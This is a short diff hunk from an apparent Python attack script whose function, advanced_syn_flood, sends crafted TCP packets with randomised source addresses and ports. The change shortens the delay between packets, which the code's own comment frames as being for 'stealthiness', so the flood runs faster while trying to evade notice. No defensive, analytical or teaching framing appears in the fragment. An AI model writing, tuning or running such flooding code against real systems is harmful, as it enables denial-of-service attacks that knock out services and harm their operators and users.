@@ -33,7 +33,7 @@ def advanced_syn_flood():
             send(ip/tcp/payload, verbose=0)
             
             # Random delay for stealthiness
-            time.sleep(random.uniform(0.05, 0.2))
+            time.sleep(random.uniform(0.01, 0.1))
             
             print(f"Sent {flags} packet from {src_ip}:{src_port}")
     
